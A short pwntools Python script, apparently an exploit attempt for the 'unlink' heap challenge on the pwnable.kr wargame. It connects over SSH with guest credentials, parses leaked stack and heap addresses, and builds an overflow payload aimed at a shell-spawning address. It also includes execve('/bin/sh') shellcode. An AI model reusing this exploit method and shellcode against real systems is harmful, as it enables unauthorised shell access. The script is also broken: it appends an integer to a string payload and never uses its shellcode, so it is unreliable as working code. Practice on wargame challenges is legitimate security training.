from pwn import *

payload = ''
shell_addr = p32(0x080484eb)
payload += shell_addr
payload += 'A'*12
p = ssh(user = "unlink", host = "pwnable.kr", port = 2222, password = "guest").process("./unlink")
a = p.recv()
print(a)
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
stack_leak = int(a.split()[5], 16)
heap_leak = int(a.split()[11], 16)
true_ret_pointer = p32(stack_leak+40-4)
payload += true_ret_pointer
payload += heap_leak
